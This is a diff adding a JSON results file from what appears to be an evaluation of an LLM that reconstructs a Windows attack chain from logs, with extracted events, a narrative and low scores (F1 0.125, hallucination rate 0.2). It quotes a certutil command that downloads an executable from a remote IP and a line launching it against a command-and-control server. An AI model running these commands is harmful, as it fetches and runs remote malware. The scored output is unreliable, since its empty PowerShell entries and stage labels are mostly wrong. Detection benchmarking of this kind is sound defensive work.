@@ -1,0 +1,92 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powerShell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powerShell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powerShell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "This attack begins with an initial access via a remote download of malware using `certutil`. The downloaded binary is executed as `agent.exe`, connecting back to a command and control server. Additional scripts are run under the context of `agent.exe` to perform various tasks such as gathering system information, modifying registry settings, scanning networks, and attempting brute force attacks against remote services.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 16896,
+      "completion_tokens": 1023,
+      "total_tokens": 17919,
+      "wall_clock_s": 17.569,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1,
+      "recall": 0.16666666666666666,
+      "f1": 0.125,
+      "tp": 1,
+      "fp": 9,
+      "fn": 5
+    },
+    "stage": {
+      "precision": 0.1,
+      "recall": 0.16666666666666666,
+      "f1": 0.125,
+      "tp": 1,
+      "fp": 9,
+      "fn": 5,
+      "recall_partial": 0.16666666666666666
+    },
+    "hallucination_rate": 0.2,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 16896,
+      "completion_tokens": 1023,
+      "total_tokens": 17919,
+      "wall_clock_s": 17.569,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
